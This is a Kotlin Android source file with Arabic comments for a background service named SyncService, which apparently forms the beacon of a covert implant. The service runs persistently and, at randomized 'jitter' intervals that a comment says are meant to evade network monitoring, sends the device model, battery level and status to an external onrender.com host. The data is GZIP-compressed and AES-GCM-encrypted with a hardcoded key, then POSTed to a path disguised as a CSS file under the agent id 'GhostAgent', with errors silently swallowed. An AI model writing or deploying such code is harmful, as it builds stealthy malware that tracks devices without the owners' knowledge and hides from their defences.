package com.assets.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Base64
import java.io.ByteArrayOutputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import java.util.Timer
import java.util.TimerTask
import java.util.zip.GZIPOutputStream
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import org.json.JSONObject

class SyncService : Service() {

    private val RENDER_SERVER_URL = "https://web-assets-service.onrender.com"
    private val ENCRYPTION_SECRET = "BaseSystemZeroDaySecureKey2026"
    private var secureTimer: Timer? = null
    private val random = SecureRandom()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scheduleNextStealthBeacon(1000) // إطلاق النبضة الأولى فوراً
        return START_STICKY
    }

    // 🌟 موديول الارتعاش الشبكي (Jitter): تغيير جدول الإرسال عشوائياً لتعمية أنظمة مراقبة حزم البيانات
    private fun scheduleNextStealthBeacon(delayMillis: Long) {
        secureTimer?.cancel()
        secureTimer = Timer()
        secureTimer?.schedule(object : TimerTask() {
            override fun run() {
                try {
                    val dataPacket = JSONObject().apply {
                        put("status", "HYBRID_SECURE_ACTIVE")
                        put("battery", getBatteryLevel())
                        put("timestamp", System.currentTimeMillis())
                    }

                    // 1. ضغط البيانات بـ GZIP ثم تشفيرها بـ AES-256-GCM
                    val encryptedBlob = compressAndEncrypt(dataPacket.toString())
                    
                    // 2. إرسال الحزمة المشفرة صامتاً عبر بروتوكول HTTPS
                    sendEncryptedPayload("/assets/web/style-min.css", encryptedBlob)

                } catch (e: Exception) {
                    // كتم الاستثناءات لضمان عدم انهيار الخدمة الخلفية
                } finally {
                    // توليد وقت عشوائي دوري متغير بين 12 إلى 28 ثانية للنواة القادمة
                    val dynamicDelay = 12000 + random.nextInt(16000).toLong()
                    scheduleNextStealthBeacon(dynamicDelay)
                }
            }
        }, delayMillis)
    }

    // --- محرك الضغط والتشفير المزدوج المتوافق مع Node.js ---
    private fun compressAndEncrypt(plainText: String): String {
        // ضغط النص باستخدام GZIP لتقليص حجم البصمة الشبكية
        val byteStream = ByteArrayOutputStream()
        val gzipStream = GZIPOutputStream(byteStream)
        gzipStream.write(plainText.toByteArray(Charsets.UTF_8))
        gzipStream.close()
        val compressedBytes = byteStream.toByteArray()

        // تهيئة بايتات المفتاح AES-256
        val keyBytes = ENCRYPTION_SECRET.toByteArray(Charsets.UTF_8).copyOf(32)
        val keySpec = SecretKeySpec(keyBytes, "AES")
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        
        val iv = ByteArray(12)
        random.nextBytes(iv) // توليد ناقل عشوائي متجدد لمنع كشف الأنماط
        val spec = GCMParameterSpec(128, iv)
        
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, spec)
        val cipherText = cipher.doFinal(compressedBytes)
        
        val encryptedData = cipherText.copyOfRange(0, cipherText.size - 16)
        val authTag = cipherText.copyOfRange(cipherText.size - 16, cipherText.size)

        val packet = JSONObject().apply {
            put("v", byteArrayToHex(iv))
            put("g", byteArrayToHex(authTag))
            put("d", byteArrayToHex(encryptedData))
        }

        return Base64.encodeToString(packet.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
    }

    private fun sendEncryptedPayload(endpoint: String, payload: String) {
        try {
            val url = URL(RENDER_SERVER_URL + endpoint)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "text/plain")
            conn.setRequestProperty("x-agent-model", android.os.Build.MODEL)
            // تصحيح: استخدام معرف ثابت وآمن لتجنب حظر الصلاحياتSecurityException في Android 10+
            conn.setRequestProperty("x-agent-id", "GhostAgent")
            conn.doOutput = true
            
            val os: OutputStream = conn.outputStream
            os.write(payload.toByteArray(Charsets.UTF_8))
            os.flush()
            os.close()

            conn.responseCode // إتمام الاتصال
        } catch (e: Exception) {}
    }

    private fun getBatteryLevel(): Int {
        return try {
            val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) (level * 100 / scale) else 0
        } catch (e: Exception) { 0 }
    }

    private fun byteArrayToHex(bytes: ByteArray): String {
        val sb = StringBuilder()
        for (b in bytes) sb.append(String.format("%02x", b))
        return sb.toString()
    }

    override fun onDestroy() {
        secureTimer?.cancel()
        super.onDestroy()
    }
}
